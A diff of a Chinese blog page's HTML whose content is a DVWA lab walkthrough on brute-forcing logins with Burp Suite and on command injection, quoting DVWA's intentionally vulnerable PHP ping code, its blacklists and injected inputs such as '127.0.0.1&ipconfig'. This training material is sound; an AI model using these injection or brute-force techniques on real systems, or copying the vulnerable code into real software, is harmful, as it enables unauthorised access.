@@ -1,452 +1,266 @@
-<!DOCTYPE HTML>
-<html lang="zh-CN">
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
 
 
 <head>
-    <meta charset="utf-8">
-	<meta name="referrer" content="unsafe-url">
-    <meta name="keywords" content="DVWA-渗透测试入门, wiki">
-    <meta name="description" content="">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <meta name="renderer" content="webkit|ie-stand|ie-comp">
-    <meta name="mobile-web-app-capable" content="yes">
-    <meta name="format-detection" content="telephone=no">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <!-- Global site tag (gtag.js) - Google Analytics -->
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="booom">
+  <meta name="keywords" content="">
+  <title>DVWA-渗透测试入门 - wiki</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 
 
-    <title>DVWA-渗透测试入门 | wiki</title>
-    <link rel="icon" type="image/png" href="/favicon.png">
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
 
-    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
-    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
-    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
-    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
-    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
-    <link rel="stylesheet" type="text/css" href="/css/matery.css">
-    <link rel="stylesheet" type="text/css" href="/css/my.css">
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
+    
+  
 
-    <script src="/libs/jquery/jquery.min.js"></script>
+  
 
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
 <meta name="generator" content="Hexo 4.2.0"></head>
 
 
 <body>
-    <header class="navbar-fixed">
-    <nav id="headNav" class="bg-color nav-transparent">
-        <div id="navContainer" class="nav-wrapper container">
-            <div class="brand-logo">
-                <a href="/" class="waves-effect waves-light">
-                    
-                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
-                    
-                    <span class="logo-span">wiki</span>
-                </a>
-            </div>
-            
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>wiki</strong>&nbsp;</a>
 
-<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
-<ul class="right nav-menu">
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/" class="waves-effect waves-light">
-      
-      <i class="fas fa-home" style="zoom: 0.6;"></i>
-      
-      <span>首页</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/tags" class="waves-effect waves-light">
-      
-      <i class="fas fa-tags" style="zoom: 0.6;"></i>
-      
-      <span>标签</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/categories" class="waves-effect waves-light">
-      
-      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
-      
-      <span>分类</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/archives" class="waves-effect waves-light">
-      
-      <i class="fas fa-archive" style="zoom: 0.6;"></i>
-      
-      <span>归档</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/about" class="waves-effect waves-light">
-      
-      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
-      
-      <span>关于</span>
-    </a>
-    
-  </li>
-  
-  <li>
-    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
-      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
-    </a>
-  </li>
-</ul>
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
 
-
-<div id="mobile-nav" class="side-nav sidenav">
-
-    <div class="mobile-head bg-color">
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
         
-        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
         
-        <div class="logo-name">wiki</div>
-        <div class="logo-desc">
-            
-            Never really desperate, only the lost of the soul.
-            
-        </div>
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
     </div>
+  </div>
+</nav>
 
-    
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
 
-    <ul class="menu-list mobile-menu-list">
-        
-        <li class="m-nav-item">
-	  
-		<a href="/" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-home"></i>
-			
-			首页
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/tags" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-tags"></i>
-			
-			标签
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/categories" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-bookmark"></i>
-			
-			分类
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/archives" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-archive"></i>
-			
-			归档
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/about" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-user-circle"></i>
-			
-			关于
-		</a>
-          
-        </li>
-        
-        
-    </ul>
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-03-05 19:26" pubdate>
+        2020年3月5日 晚上
+      </time>
+    </span>
+  
 </div>
 
-
-        </div>
-
-        
-    </nav>
-
-</header>
-
+<div class="mt-1">
+  
     
-<script src="/libs/cryptojs/crypto-js.min.js"></script>
-<script>
-    (function() {
-        let pwd = '';
-        if (pwd && pwd.length > 0) {
-            if (pwd !== CryptoJS.SHA256(prompt('本文章暂不公开')).toString(CryptoJS.enc.Hex)) {
-                alert('密码错误，将返回主页！');
-                location.href = '/';
-            }
-        }
-    })();
-</script>
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      4.3k 字
+    </span>
+  
 
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      61
+       分钟
+    </span>
+  
 
-
-
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://dewhurstsecurity.com/img/projects/project1.png')">
-    <div class="container" style="right: 0px;left: 0px;">
-        <div class="row">
-            <div class="col s12 m12 l12">
-                <div class="brand">
-                    <h1 class="description center-align post-title">DVWA-渗透测试入门</h1>
-                </div>
-            </div>
-        </div>
-    </div>
+  
+  
 </div>
 
+            
+          </div>
 
-
-
-<main class="post-container content">
-
-    
-    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
-<style>
-    #articleContent h1::before,
-    #articleContent h2::before,
-    #articleContent h3::before,
-    #articleContent h4::before,
-    #articleContent h5::before,
-    #articleContent h6::before {
-        display: block;
-        content: " ";
-        height: 100px;
-        margin-top: -100px;
-        visibility: hidden;
-    }
-
-    #articleContent :focus {
-        outline: none;
-    }
-
-    .toc-fixed {
-        position: fixed;
-        top: 64px;
-    }
-
-    .toc-widget {
-        width: 345px;
-        padding-left: 20px;
-    }
-
-    .toc-widget .toc-title {
-        margin: 35px 0 15px 0;
-        padding-left: 17px;
-        font-size: 1.5rem;
-        font-weight: bold;
-        line-height: 1.5rem;
-    }
-
-    .toc-widget ol {
-        padding: 0;
-        list-style: none;
-    }
-
-    #toc-content {
-        height: calc(100vh - 250px);
-        overflow: auto;
-    }
-
-    #toc-content ol {
-        padding-left: 10px;
-    }
-
-    #toc-content ol li {
-        padding-left: 10px;
-    }
-
-    #toc-content .toc-link:hover {
-        color: #42b983;
-        font-weight: 700;
-        text-decoration: underline;
-    }
-
-    #toc-content .toc-link::before {
-        background-color: transparent;
-        max-height: 25px;
-
-        position: absolute;
-        right: 23.5vw;
-        display: block;
-    }
-
-    #toc-content .is-active-link {
-        color: #42b983;
-    }
-
-    #floating-toc-btn {
-        position: fixed;
-        right: 15px;
-        bottom: 76px;
-        padding-top: 15px;
-        margin-bottom: 0;
-        z-index: 998;
-    }
-
-    #floating-toc-btn .btn-floating {
-        width: 48px;
-        height: 48px;
-    }
-
-    #floating-toc-btn .btn-floating i {
-        line-height: 48px;
-        font-size: 1.4rem;
-    }
-</style>
-<div class="row">
-    <div id="main-content" class="col s12 m12 l9">
-        <!-- 文章内容详情 -->
-<div id="artDetail">
-    <div class="card">
-        <div class="card-content article-info">
-            <div class="row tag-cate">
-                <div class="col s7">
-                    
-                    <div class="article-tag">
-                        
-                            <a href="/tags/web/">
-                                <span class="chip bg-color">web</span>
-                            </a>
-                        
-                            <a href="/tags/DVWA/">
-                                <span class="chip bg-color">DVWA</span>
-                            </a>
-                        
-                            <a href="/tags/XSS/">
-                                <span class="chip bg-color">XSS</span>
-                            </a>
-                        
-                    </div>
-                    
-                </div>
-                <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/Web/" class="post-category">
-                                Web
-                            </a>
-                        
-                    </div>
-                    
-                </div>
-            </div>
-
-            <div class="post-info">
-                
-                <div class="post-date info-break-policy">
-                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-03-05
-                </div>
-                
-
-                
-                <div class="post-date info-break-policy">
-                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-09-02
-                </div>
-                
-
-                
-                <div class="info-break-policy">
-                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    4.6k
-                </div>
-                
-
-                
-                <div class="info-break-policy">
-                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    22 分
-                </div>
-                
-
-                
-                    <div id="busuanzi_container_page_pv" class="info-break-policy">
-                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
-                        <span id="busuanzi_value_page_pv"></span>
-                    </div>
-				
-            </div>
+          
         </div>
-        <hr class="clearfix">
-        <div class="card-content article-card-content">
-            <div id="articleContent">
-                <p>dvwa是web渗透测试入门训练平台，了解基础的web安全知识，通过搭建这个平台并学习利用平台上的漏洞来提高自己的能力。</p>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">DVWA-渗透测试入门</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <p>dvwa是web渗透测试入门训练平台，了解基础的web安全知识，通过搭建这个平台并学习利用平台上的漏洞来提高自己的能力。</p>
 <h2 id="DVWA-渗透测试入门"><a href="#DVWA-渗透测试入门" class="headerlink" title="DVWA-渗透测试入门"></a>DVWA-渗透测试入门</h2><h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><p>暴力破解即用暴力穷举的方式大量尝试性地猜破密码。</p>
 <h4 id="low"><a href="#low" class="headerlink" title="low"></a>low</h4><p>刚开始看到这个题目不知如何下手。只知道要使用暴力破解，我手头也没有字典。然后就从网上随便找了一个字典进行测试。</p>
 <p>首先打开burpsuite抓包。</p>
-<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegkp6cjvqj30ne07haa4.jpg"/>
+<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegkp6cjvqj30ne07haa4.jpg" srcset="/img/loading.gif"/>
 
 <p>抓到数据包。send to intruder，我第一次做时，是使用sniper模式进行爆破的。用户名随便输了个admin，只设置了密码变量。成功爆出密码后，又使用cluster bomb模式进行了多变量交叉爆破。</p>
-<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegkq3lge8j30o10c6jsl.jpg"/>
+<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegkq3lge8j30o10c6jsl.jpg" srcset="/img/loading.gif"/>
 
-<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjrsh33gj30z10dz0ub.jpg"/>
+<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjrsh33gj30z10dz0ub.jpg" srcset="/img/loading.gif"/>
 
 <p>成功爆破到用户名和密码。</p>
-<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjszl523j30n80i4gn9.jpg"/>
+<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjszl523j30n80i4gn9.jpg" srcset="/img/loading.gif"/>
 
 <p>暴力破解成功</p>
-<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegju8ma2kj30nj09a3yo.jpg"/>
+<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegju8ma2kj30nj09a3yo.jpg" srcset="/img/loading.gif"/>
 
 <h4 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h4><p>仍然可以爆破成功。爆破时间长了一点。</p>
-<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjupv6b0j30n30i3404.jpg"/>
+<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjupv6b0j30n30i3404.jpg" srcset="/img/loading.gif"/>
 
 <p>查看源代码，发现有sleep(2)的函数。登陆失败会等待2秒。</p>
 <h4 id="high"><a href="#high" class="headerlink" title="high"></a>high</h4><p>还用之前的方法进行尝试，发现除了第一个包返回正常，其他的都显示302。看来之前的方法行不通了。</p>
 <p>看看源代码。好像多加了一个参数，没思路。看看别人怎么搞的。</p>
 <p>有token验证。抓包使用pitchfork模式。添加爆破的参数。</p>
-<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjv4tbaij30yp0dxgn8.jpg"/>
+<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjv4tbaij30yp0dxgn8.jpg" srcset="/img/loading.gif"/>
 
 <p>对攻击的模块做一些配置，线程设为1个线程。</p>
-<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjvh80z7j30yu0gb75a.jpg"/>
+<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjvh80z7j30yu0gb75a.jpg" srcset="/img/loading.gif"/>
 
 <p>允许重定向。</p>
-<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjvu60cnj30hr05wjrh.jpg"/>
+<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjvu60cnj30hr05wjrh.jpg" srcset="/img/loading.gif"/>
 
 <p>在Option中Grep-Extract模块，添加筛选条件，获得user_token。</p>
-<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjwi50ejj30ss0pewhr.jpg"/>
+<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjwi50ejj30ss0pewhr.jpg" srcset="/img/loading.gif"/>
 
 <p>为了能够成功破解，把字典缩小了一下，并将其正确的账号和密码对应起来，才成功爆破。要是不知道账号密码，爆破起来还是很困难的。</p>
-<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjwv4mgej30ud0i076a.jpg"/>
+<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjwv4mgej30ud0i076a.jpg" srcset="/img/loading.gif"/>
 
 <p>我觉得这样pitchfork爆破有点鸡肋，必须账号字典和密码字典刚好一一对应起来才能爆破成功。总之爆破成功不太容易。</p>
 <p>使用交叉爆破模式，三个参数又比较费时间。太难了。</p>
-<h4 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h4><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjx4caapj30no0asdgd.jpg"/>
+<h4 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h4><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjx4caapj30no0asdgd.jpg" srcset="/img/loading.gif"/>
 
 <p>输错一次就要等15分钟，GG。暴力破解基本没得搞。</p>
 <h3 id="DVWA命令执行漏洞"><a href="#DVWA命令执行漏洞" class="headerlink" title="DVWA命令执行漏洞"></a>DVWA命令执行漏洞</h3><h4 id="什么是命令执行漏洞"><a href="#什么是命令执行漏洞" class="headerlink" title="什么是命令执行漏洞"></a>什么是命令执行漏洞</h4><p>命令执行漏洞的原理：在操作系统中，&amp;、&amp;&amp;、|、||都可以作为命令连接符使用，用户通过客户端提交执行命令，服务器端未做过滤，导致命令执行成功的过程。</p>
@@ -456,176 +270,180 @@
 <p>A||B          A执行失败，然后再执行B  </p>
 <hr>
 <h4 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h4><p>查看一下源代码：</p>
-<pre><code class="php">&lt;?php
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 
-if( isset( $_POST[ &#39;Submit&#39; ]  ) ) {
-    // Get input
-    $target = $_REQUEST[ &#39;ip&#39; ];
+<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_POST[ <span class="hljs-string">'Submit'</span> ]  ) ) &#123;
+	<span class="hljs-comment">// Get input</span>
+	$target = $_REQUEST[ <span class="hljs-string">'ip'</span> ];
 
-    // Determine OS and execute the ping command.
-    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {
-        // Windows
-        $cmd = shell_exec( &#39;ping  &#39; . $target );
-    }
-    else {
-        // *nix
-        $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );
-    }
+	<span class="hljs-comment">// Determine OS and execute the ping command.</span>
+	<span class="hljs-keyword">if</span>( stristr( php_uname( <span class="hljs-string">'s'</span> ), <span class="hljs-string">'Windows NT'</span> ) ) &#123;
+		<span class="hljs-comment">// Windows</span>
+		$cmd = shell_exec( <span class="hljs-string">'ping  '</span> . $target );
+	&#125;
+	<span class="hljs-keyword">else</span> &#123;
+		<span class="hljs-comment">// *nix</span>
+		$cmd = shell_exec( <span class="hljs-string">'ping  -c 4 '</span> . $target );
+	&#125;
 
-    // Feedback for the end user
-    $html .= &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;
-}
+	<span class="hljs-comment">// Feedback for the end user</span>
+	$html .= <span class="hljs-string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;
+&#125;
 
-?&gt;</code></pre>
+<span class="hljs-meta">?&gt;</span></code></pre>
+
 <p>输入一个IP试一下。<code>127.0.0.1</code></p>
-<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjxk3zogj30v30dimza.jpg"/>
+<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjxk3zogj30v30dimza.jpg" srcset="/img/loading.gif"/>
 
 <p>返回正常，尝试添加其他命令。<code>127.0.0.1&amp;ipconfig</code></p>
-<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjy7euevj30uv0odjvo.jpg"/>
+<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjy7euevj30uv0odjvo.jpg" srcset="/img/loading.gif"/>
 
 <p>&amp;两边的命令都被成功执行。<code>127.0.0.1&amp;&amp;ipconfig</code></p>
-<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjygltrbj30uv0oy42u.jpg"/>
+<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjygltrbj30uv0oy42u.jpg" srcset="/img/loading.gif"/>
 
 <p>&amp;&amp;两边的命令都被成功执行。<code>127.0.0.1|ipconfig</code></p>
-<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjyq07zrj30v20nzq6g.jpg"/>
+<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjyq07zrj30v20nzq6g.jpg" srcset="/img/loading.gif"/>
 
 <p>经过验证表明，<code>|</code>前面的命令不会被执行。只执行后面的命令。</p>
-<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjyzbmyaj30ne08tt96.jpg"/>
+<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjyzbmyaj30ne08tt96.jpg" srcset="/img/loading.gif"/>
 
 <p>使用<code>||</code>命令试一下，<code>127.0.0.1||ipconfig</code></p>
-<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjz9feeoj30v10kh0vz.jpg"/>
+<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjz9feeoj30v10kh0vz.jpg" srcset="/img/loading.gif"/>
 
 <p>发现<code>||</code>前的命令必须是错误的才能执行<code>||</code>后的命令。否则只执行<code>||</code>前的命令。</p>
 <h4 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h4><p>首先，查看源代码：</p>
-<pre><code class="php">&lt;?php
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 
-if( isset( $_POST[ &#39;Submit&#39; ]  ) ) {
-    // Get input
-    $target = $_REQUEST[ &#39;ip&#39; ];
+<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_POST[ <span class="hljs-string">'Submit'</span> ]  ) ) &#123;
+	<span class="hljs-comment">// Get input</span>
+	$target = $_REQUEST[ <span class="hljs-string">'ip'</span> ];
 
-    // Set blacklist
-    $substitutions = array(
-        &#39;&amp;&amp;&#39; =&gt; &#39;&#39;,
-        &#39;;&#39;  =&gt; &#39;&#39;,
-    );
+	<span class="hljs-comment">// Set blacklist</span>
+	$substitutions = <span class="hljs-keyword">array</span>(
+		<span class="hljs-string">'&amp;&amp;'</span> =&gt; <span class="hljs-string">''</span>,
+		<span class="hljs-string">';'</span>  =&gt; <span class="hljs-string">''</span>,
+	);
 
-    // Remove any of the charactars in the array (blacklist).
-    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
+	<span class="hljs-comment">// Remove any of the charactars in the array (blacklist).</span>
+	$target = str_replace( array_keys( $substitutions ), $substitutions, $target );
 
-    // Determine OS and execute the ping command.
-    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {
-        // Windows
-        $cmd = shell_exec( &#39;ping  &#39; . $target );
-    }
-    else {
-        // *nix
-        $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );
-    }
+	<span class="hljs-comment">// Determine OS and execute the ping command.</span>
+	<span class="hljs-keyword">if</span>( stristr( php_uname( <span class="hljs-string">'s'</span> ), <span class="hljs-string">'Windows NT'</span> ) ) &#123;
+		<span class="hljs-comment">// Windows</span>
+		$cmd = shell_exec( <span class="hljs-string">'ping  '</span> . $target );
+	&#125;
+	<span class="hljs-keyword">else</span> &#123;
+		<span class="hljs-comment">// *nix</span>
+		$cmd = shell_exec( <span class="hljs-string">'ping  -c 4 '</span> . $target );
+	&#125;
 
-    // Feedback for the end user
-    $html .= &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;
-}
+	<span class="hljs-comment">// Feedback for the end user</span>
+	$html .= <span class="hljs-string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;
+&#125;
 
-?&gt;</code></pre>
+<span class="hljs-meta">?&gt;</span></code></pre>
+
 <p>发现只过滤了两个符号。</p>
 <blockquote>
-<pre><code class="php">$substitutions = array(
-    &#39;&amp;&amp;&#39; =&gt; &#39;&#39;,
-    &#39;;&#39;  =&gt; &#39;&#39;,
+<pre><code class="hljs php">$substitutions = <span class="hljs-keyword">array</span>(
+	<span class="hljs-string">'&amp;&amp;'</span> =&gt; <span class="hljs-string">''</span>,
+	<span class="hljs-string">';'</span>  =&gt; <span class="hljs-string">''</span>,
 );</code></pre>
 </blockquote>
 <p>那么其他&amp;、|、||仍然能够使用。</p>
-<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjzksq2nj30nl0c23zd.jpg"/>
+<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjzksq2nj30nl0c23zd.jpg" srcset="/img/loading.gif"/>
 
-<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjzscr8lj30n00k9jty.jpg"/>
+<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjzscr8lj30n00k9jty.jpg" srcset="/img/loading.gif"/>
 
-<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk004ok9j30nb0hc0uu.jpg"/>
+<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk004ok9j30nb0hc0uu.jpg" srcset="/img/loading.gif"/>
 
 <h4 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h4><p>先查看一下源代码：</p>
-<pre><code class="php">&lt;?php
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 
-if( isset( $_POST[ &#39;Submit&#39; ]  ) ) {
-    // Get input
-    $target = trim($_REQUEST[ &#39;ip&#39; ]);
+<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_POST[ <span class="hljs-string">'Submit'</span> ]  ) ) &#123;
+	<span class="hljs-comment">// Get input</span>
+	$target = trim($_REQUEST[ <span class="hljs-string">'ip'</span> ]);
 
-    // Set blacklist
-    $substitutions = array(
-        &#39;&amp;&#39;  =&gt; &#39;&#39;,
-        &#39;;&#39;  =&gt; &#39;&#39;,
-        &#39;| &#39; =&gt; &#39;&#39;,
-        &#39;-&#39;  =&gt; &#39;&#39;,
-        &#39;$&#39;  =&gt; &#39;&#39;,
-        &#39;(&#39;  =&gt; &#39;&#39;,
-        &#39;)&#39;  =&gt; &#39;&#39;,
-        &#39;`&#39;  =&gt; &#39;&#39;,
-        &#39;||&#39; =&gt; &#39;&#39;,
-    );
+	<span class="hljs-comment">// Set blacklist</span>
+	$substitutions = <span class="hljs-keyword">array</span>(
+		<span class="hljs-string">'&amp;'</span>  =&gt; <span class="hljs-string">''</span>,
+		<span class="hljs-string">';'</span>  =&gt; <span class="hljs-string">''</span>,
+		<span class="hljs-string">'| '</span> =&gt; <span class="hljs-string">''</span>,
+		<span class="hljs-string">'-'</span>  =&gt; <span class="hljs-string">''</span>,
+		<span class="hljs-string">'$'</span>  =&gt; <span class="hljs-string">''</span>,
+		<span class="hljs-string">'('</span>  =&gt; <span class="hljs-string">''</span>,
+		<span class="hljs-string">')'</span>  =&gt; <span class="hljs-string">''</span>,
+		<span class="hljs-string">'`'</span>  =&gt; <span class="hljs-string">''</span>,
+		<span class="hljs-string">'||'</span> =&gt; <span class="hljs-string">''</span>,
+	);
 
-    // Remove any of the charactars in the array (blacklist).
-    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
+	<span class="hljs-comment">// Remove any of the charactars in the array (blacklist).</span>
+	$target = str_replace( array_keys( $substitutions ), $substitutions, $target );
 
-    // Determine OS and execute the ping command.
-    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {
-        // Windows
-        $cmd = shell_exec( &#39;ping  &#39; . $target );
-    }
-    else {
-        // *nix
-        $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );
-    }
